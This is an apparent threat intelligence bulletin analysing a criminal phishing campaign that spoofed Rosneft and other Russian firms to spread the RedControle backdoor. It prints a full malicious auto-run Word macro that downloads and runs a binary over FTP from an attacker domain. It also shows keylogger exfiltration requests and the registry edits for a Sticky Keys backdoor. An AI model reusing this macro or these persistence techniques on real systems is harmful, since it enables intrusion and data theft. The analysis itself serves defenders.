When events of geopolitical significance hit the\npapers, researchers look for parallel signs of sub rosa cyber activity carried out by statesponsored threat actors—espionage, sabotage, coercion, information operations—to\ncomplete the picture. After all, behind every story may lurk a cyber campaign.\n\nBut ordinary criminals read the newspaper too and are keenly aware of the bias some\nresearchers bring to the table. Exploiting that bias can provide additional camouflage,\nanother layer of seeming invisibility, making threat actors harder to detect.\n\nIn this Threat Intelligence Bulletin, we’ll show how an investigation into the apparent\ntargeting of a state-owned Russian oil company led to the uncovering not of a statesponsored campaign but of the bold activity of what we believe to be a criminal effort\nmotivated by the oldest of incentives—money.\n\n## Background\n\nRosneft calls itself the world’s largest publicly traded oil company, and, according to recent\nanalysis in the New York Times, it is also a prominent [foreign policy tool of the Russian](https://www.nytimes.com/2017/10/29/business/energy-environment/russia-venezula-oil-rosneft.html)\ngovernment. More than half of the company is owned by Moscow and serves as a major\npillar of critical infrastructure for Russia as well as other neighboring nation states.\n\nSo when a deal reportedly worth an excess of $10 billion was [announced to take nearly 20%](https://apnews.com/661b47f59d894a9fbb316757dda908ea)\nof the company private, news organizations around the world took note.\n\n[The deal quickly became the subject of international political intrigue: Who were the](https://www.reuters.com/article/us-russia-rosneft-privatisation-insight/how-russia-sold-its-oil-jewel-without-saying-who-bought-it-idUSKBN1582OH)\nbuyers? Why was it sold? Who brokered the deal? Facts that became even more apparent\n[when the transaction received conspicuous mention in the now-infamous Steele Dossier.](https://www.documentcloud.org/documents/3259984-Trump-Intelligence-Allegations.html)\n\nReporters, business leaders, and international observers also focused scrutiny on Rosneft\n[in part because the deal was, according to news reports, fraught with delays and setbacks](https://www.reuters.com/article/rosneft-qatar/qatar-steps-in-to-rescue-rosnefts-troubled-stake-sale-to-china-idUSL8N1SB6C1)\n[and came to involve a cast of characters that reportedly included a former Qatari diplomat](https://slate.com/news-and-politics/2018/05/michael-cohens-meetings-with-michael-flynn-and-ahmed-al-rumaihi-might-be-the-key-to-unlocking-the-steele-dossier.html)\nturned head of a sovereign wealth fund.\n\nEverything we learned about Rosneft in the last few years—its status as critical\ninfrastructure, the huge sums of money involved in its privatization, its domestic and\ninternational political significance—made it a highly likely and legitimate target of foreign\nespionage efforts.\n\n\n-----\n\nthought that was exactly what we were looking at: another state or state-sponsored\nespionage effort.\n\nBut we soon discovered that our initial impressions were flawed.\n\n## Evolution of a Threat\n\nIn July 2017, Cylance stumbled upon some interesting macros embedded in Word\ndocuments we uncovered in a common malware repository that seemed to be aimed at\nRussian-speaking users. We observed the same type of document resurface in the\nbeginning of 2018 and decided to take a closer look.\n\nUpon closer inspection, we noticed that the malware author meticulously used command\nand control (C2) domains which very closely mimicked their real counterparts in the\nRussian oil and gas industries, in particular Rosneft and subsidiaries of Rosneft.\n\nAs we investigated further, we discovered that the threat actor had created similar sites to\nmimic more than two dozen mostly state-owned oil, gas, chemical, agricultural, and other\ncritical infrastructure organizations, in addition to major Russian financial exchanges.\n\nThe first Rosneft-related site we came across was “rnp-rosneft[.]ru” which was designed to\nresemble the legitimate webpage “mp-rosneft[.]ru”. The only reference to this domain we\ncould identify was the email address “sec_hotline@mp-rosneft[.]ru” which was used by\nRosneft for confidentially reporting corporate fraud, corruption, and embezzlement.\n\nAfter a bit of malware excavation, we discovered that the author had been operating for\nmore than three years with very few changes to the actual malware used other than his/her\ntargets. Interestingly, we uncovered evidence that suggests the actor started out targeting\nthe gaming community, specifically users of Steam, then quickly evolved to more lucrative\nendeavors.\n\n## Technical Analysis\n\n Phishing Documents Analysis\n\nCylance researchers identified several phishing documents which used Microsoft Office\nmacros to deliver malicious implants to their targets. It’s not entirely clear whether these\nwere specifically targeted at isolated groups or utilized the old spray-and-pray method to\ncast a much wider net. Let’s take a look at one:\n\n**SHA256: 7bb9f72436bcbb5fcb190ebc2cce77e1ea41ba0e6614bf2347b4514e7d65da4a**\n**Filename: На ознакомление.doc ~ For Review.doc**\n\nSub AutoOpen()\n'\n' AutoOpen [redacted]\n'\n\n\n-----\n\nDim fso, tf\nDim St As String\nDim LocalFile As String\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet objShell = CreateObject(\"WScript.shell\")\nLocalFile = Environ(\"APPDATA\") & \"\\1.cmd\"\nSt = \"cd %APPDATA%\" & vbNewLine\nSt = St + \"echo open rnp-rosneft.ru>>1.txt\" & vbNewLine\nSt = St + \"echo admin_root>>1.txt\" & vbNewLine\nSt = St + \"echo [redacted]>>1.txt\" & vbNewLine\nSt = St + \"echo cd /public_html/>>1.txt\" & vbNewLine\nSt = St + \"echo binary>>1.txt\" & vbNewLine\nSt = St + \"echo get module.exe module.exe>>1.txt\" & vbNewLine\nSt = St + \"echo bye>>1.txt\" & vbNewLine\nSt = St + \"ftp.exe -s:1.txt & start module.exe & del /f 1.txt & del /f 1.cmd\"\n\nSet tf = fso.CreateTextFile(LocalFile, True)\ntf.Write (St)\ntf.Close\n\nIf fso.FileExists(LocalFile) = True Then\nSelection.WholeStory\nSelection.Delete Unit:=wdCharacter, Count:=1\nobjShell.Run \"cmd /K cd %APPDATA% & 1.cmd\", 0\nSelection.TypeText Text:=\"????????? ??????\" + \"???\"\n\nEnd If\n\nEnd Sub\n\n_Figure 1: Macro Contents of Phishing Document_\n\nAt a high level, this macro will write a number of FTP commands to a text file named “1.txt”\nin %APPDATA%. When executed by the last command it will login and download a file from\nan ftp server hosted on “rnp-rosneft[.]ru” and save it as “module.exe”. It then starts the\n“module.exe” binary and deletes another file named “1.cmd”. The binary “module.exe” was\na modern variant of a family of malware that ESET calls “RedControle.” Cylance identified\nseveral other phishing documents which operated in a similar vein that are listed in the\nAppendix.\n\n## Malware Analysis\n\nWe were able to recover several recent samples associated with phishing attempts\nconnected to the rnp-rosfnet[.]ru domain as well as some older samples tied to trstorg[.]ru\nfrom July 2017. From what we could gather, “tstorg[.]ru” was originally the website of a\n\n\n-----\n\nand road-building equipment; the company specialized in providing parts for Caterpillar,\nKomatsu, Volvo, Fiat, and Hitachi equipment.\n\nThis sample was first submitted to online virus scanners in July 2017 and detected by only\n13 companies at that time:\n\n**SHA256 of 2017 RedControle Sample:**\n736aa303b35ee23204e0e7d48cb31f77605234609c2b3d89a054b7c3ec2c0544\n\n**Filenames:**\nАктуальный ПРАЙС10.07.2017.exe, ApMsgFwd.exe, SetLogin1Connect.exe\n\nThe backdoor was programmed in Delphi and communicates over HTTP to two C2 servers.\nIt sends information about the IP address, hostname, and attached drives in its initial\ncommunications.\n\nIt first attempts to communicate directly to the IP address “91.211.245[.]246” on TCP port\n80 and then will attempt to communicate to “83.166.242[.]15” on TCP port 17425.\nKeystroke data, clipboard data, as well as window names are communicated in clear text\nvia HTTP to the 91.211.245[.]246 in near-real time as the victim interacts with their\ncomputer.\n\nThe information is collected using a well-known method leveraging the\nSetWindowsHookExA API. Commands are received from the other C2 server\n“83.166.245[.]15” in what appears to be cleartext; however, the backdoor also has the\nability to communicate over SSL using the Delphi Indy library:\n\nGET /buffer.php?buffer=--------------------------------------------------------------------%0D%0AIDA++C%3A%5CDocuments+and+Settings%5CAdministrator%5CDesktop%5Ctst%5CApMs\ngFwd.exe%0D%0A--------------------------------------------------------------------%0D%0A17425%0D%0A---------------------------------------------------------------------%0D%0A\nHTTP/1.1\nHost: 91.211.245.246\nAccept: text/html, */*\nAccept-Encoding: identity\nUser-Agent: Mozilla/3.0 (compatible; Indy Library)\nGET /key.php?key=--------------------------------------------------------------------%0D%0AC%3A%5CWINDOWS%5Csystem32%5Ccmd.exe+-+FakeNet.exe%0D%0A--------------------------------------------------------------------%0D%0Ahelp%0D%0A%0D%0A--------------------------------------------------------------------%0D%0A HTTP/1.1\nHost: 91.211.245.246\nAccept: text/html, */*\nAccept-Encoding: identity\nUser-Agent: Mozilla/3.0 (compatible; Indy Library)\n\n_Figure 2: Example TCP HTTP Requests Sending Keystroke and Window Data_\n\n\n-----\n\nregistry hive\n\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ApMsgFwd.exe”.\n\nThe backdoor had the ability to upload and download files, manipulate files and folders,\ncompress and decompress files using ZLIB, enumerate drive information and host\ninformation, elevate privileges, capture screenshots and webcam pictures, block and/or\nsimulate user input, log keystrokes, and manipulate processes on the infected system.\n\nDirectives from the C2 were randomly broken up by the character “_” in an attempt to likely\nevade HIDS and NIDS signatures such as the command “ST_A_RT_FI_LE”.\n\nLater versions of RedControle used randomized strings broken up by the same “_”\ncharacter to further hinder signature-based analysis and reverse engineering efforts. In the\nsample Cylance researchers analyzed, the initial connection looked something like this:\n\nWhere the string in BLUE was sent by the C2 server and the string in RED was sent by the\nvictim as an initial check in containing the IP address and a unique victim identifier. The\nbackdoor operated using a series of threads which were designed to segment different\nbackdoor functionality into autonomous threads which ran based on different pre-defined\nDelphi-based timers.\n\nThe backdoor appeared to be a mishmash of different authorship with the keylogger\nportion containing Portuguese language strings and other functions related to process\nmanipulation containing references to Slavic language strings. These strings were\neventually removed or obfuscated in later versions.\n\n## The Dropper\n\nCylance identified an executable dropper:\n\nb65125ee14f2bf12a58f67c623943658dd457e5b40b354da0975d7615fe9d932\n\nThe dropper planted a version of RedControle on the system as well as another interesting\nbinary while showing the potential victim a nice picture of a holiday present. The dropper\nwas relatively uninteresting; however, a Sticky Keys backdoor would also be placed on the\nsystem, which warranted additional analysis.\n\n**Dropper SHA256 Hash:**\nb65125ee14f2bf12a58f67c623943658dd457e5b40b354da0975d7615fe9d932\n\n**Associated RedControle SHA256:**\n8f7cf81d8bfb3780b48693020a18071a9fd382d06b0b7932226b4d583b03c3af\n\n\n-----\n\nThe dropper created two executable files within the folder\n“%ALLUSERSPROFILE%\\Documents”, “svhost.exe” and “system.exe” and created two\nassociated Run keys to maintain persistence for both executables. The program\n“svhost.exe” was the aforementioned RedControle variant with network callbacks to the\ndomain “trstorg[.]ru” and the IP address “83.166.243[.]48”.\n\nThe “system.exe” file was a StickyKeys backdoor programmed in Delphi. It first opened\nTCP port 3389 in the Windows Firewall and then set the following Registry Keys:\n\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution\nOptions\\sethc.exe\\Debugger -> C:\\WINDOWS\\system32\\taskmgr.exe\nHKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections ->\nnull value\n\nThe file was primarily responsible for enabling RDP on the target system and performing a\nsticky keys hijack to point to the legitimate “taskmgr.exe” binary.\n\nIf our readers are unfamiliar with StickyKeys, it was originally designed for people who\nhave difficulty holding down two or more keys simultaneously. StickyKeys can be enabled\non Windows by rapidly pressing the shift key five times. The registry key above will\nsimultaneously launch the Task Manager binary “taskmgr.exe” along with the intended\nStickyKeys binary. The StickyKeys backdoor can then test corresponded to “google.ru” and\nvarious subdomains. If the test is successful, it will make the following HTTP request to\n“trstorg[.]ru” on TCP port 80:\n\nGET /bas.php HTTP/1.1\nUser-Agent: DMFR\nHost: trstorg.ru\nCache-Control: no-cache\n\nHTTP/1.1 200 OK\nServer: nginx\nDate: Thu, 19 Jan 2017 17:18:48 GMT\nContent-Type: text/html\nContent-Length: 0\nConnection: keep-alive\nKeep-Alive: timeout=60\nX-Powered-By: PHP/5.5.9-1ubuntu4.\n\n_Figure 3: Example Request and Server Response from StickyKeys Backdoor_\n\nThis particular sample will no longer work as the IP address “80.254.96[.]251” appeared to\nhave been reassigned to another party and no longer operates a webserver.\n\n## Open Source Intelligence Analysis\n\nThe RedControle backdoors frequently created the unique mutex\n\n\n-----\n\nwhich directly links the above samples to the following hashes through open source\nintelligence:\n\n10c5bf2733b7147c3663baa597b2e960069edcadf794d1ec299dfcbab489dfe1\n11e8692a2d2995b105591c42fcd7a0427223f2a6b16f8e6614820024cb3415f4\n27614102c5386333ecd43bb086752397726783f4d1e7fe0c1735686b5199a623\n4f6de2c6d6c80b459f0bdb88cf2ce22e44ad4f3045909cbd8c1fb7632956fb63\n51bc34307923d83b795319877924c9ed926366758d4662c36dce58f3a1ae20bb\n7a7a139b55cd5ddcbcb8f91be1d2a247d42243d2d4a595252851987075a4338d\n93b2e268ca5b8fede64edc0da7195adebbe8fa490de96b5eec1489b7868710f3\na077c085dccb900ddab2542b4b332f7c43b3674c71d5cd11afdd2861b6fec2b8\nc8ca5e80d3f14102fd81b0fda54120d6ce9519a72b9d3aca23cf9b5cc8c93549\n\nSeveral of these samples communicated to the domains “sxe-csgo[.]net” and\n“h84622.s05.test-hf[.]su”.\n\nThese domains led to two primary IP addresses: “91.227.16[.]115” and “91.227.16[.]6” as\nwell as a few hundred unique file hashes.\n\nThe IP addresses “109.68.190[.]244” and “46.38.50[.]106” which resolved to “sxecsgo[.]net” in 2015 and 2016 let Cylance definitively tie this subset of activity to activity\ntargeting the Russian Steam community as well as the Counterstrike and CS:Go\n[communities previously documented here, here, and here.](https://securelist.com/all-your-creds-are-belong-to-us/74137/)\n\n## Infrastructure Analysis\n\nThe threat actor left bits of infrastructure open over time and Cylance was able to harvest\nsome of the server-side scripts utilized by the malware for tracking and recording data\nstolen from intended victims. Additionally, the attacker utilized Cloudflare for free bulk SSL\ncertificates, which inadvertently exposed a number of domains.\n\nThe attacker put a lot of time and effort into closely imitating legitimate domains and\ncontinually altered their targets over time. They would also occasionally register legitimate\ndomains after the domains had expired.\n\nThe actor relied heavily upon the Lithuanian provider “vpsnet[.]lt” likely as a result of the low\ncost overhead of a couple euros per month per virtual private server (VPS).\n\n## Conclusions\n\nWhen we first discovered that the threat actor was using more than two dozen websites to\nmimic real Russian critical infrastructure companies, we were intrigued. The effort required\nto set up those domains seemed disproportionate to the perceived benefit of using them\nsimply as command-and-control infrastructure.\n\n\n-----\n\n2017 and entitled (in Google’s translation to English) _Attack of the Clones: How Schemes_\n_Work with Fake Sites of Rosneft and Other Large Companies._\n\nThe author was Ilya Sachkov, the founder and CEO of infosec company Group-IB and a\nmember of cybercrime expert committees in the Council of Europe and the OSCE.\n\nThe article described what appeared to be unpublished Group-IB research findings into an\nelaborate criminal scheme wherein a threat actor was creating near-clones of legitimate\nRussian critical infrastructure companies—Rosneft most prominent among them—in order\nto harvest credentials and perpetuate fraud.\n\nIn the article, Sachkov provided screen shots of many of the mimicked sites to establish\njust how painstakingly close to the original these fake sites were designed to look.\n\nThe article referenced several of the companies and websites by name, which Group-IB said\nwere part of the fraud campaign. At least one of the affected companies was described in\nthe article as being a client of Group-IB.\n\nThat company’s domain, as well as nearly all of the other domains cited by Group-IB were\nalso uncovered in the Cylance investigation. For example, in addition to Rosneft, they\nincluded: Mendeleevkazot, HCSDS, and EuroChem. Mendeleevkazot is a fertilizer\nmanufacturer and part of a larger Russian critical infrastructure holding company. HCSDS\nis an acronym for a Siberian Business Union, a holding company comprised of several\nRussian critical infrastructure companies. EuroChem (Group-IB’s apparent client) is a\nSwiss-based fertilizer company with its primary mining activity in Russia. Its name came up\nin several news-related searches indicating its involvement in large financial transactions\nas well as geopolitical maneuvering.\n\nGiven the overlap in findings and the direct connection to past criminal campaigns\ntargeting the gaming community, it seemed clear we were looking at the same operation—a\ncriminal operation, not nation-state espionage activity.\n\nThe line between well-organized criminal efforts and nation-state activity can often be\nblurry, but practitioners and consumers of threat intelligence should beware of inherent\nbiases. As we have shown in this Bulletin, what appears at first blush to be a clear indicator\nof nation-state malfeasance may in fact simply allow a criminal to hack your way of\nthinking shortly before hacking your organization.\n\n## Appendix\n\n**_Phishing Documents
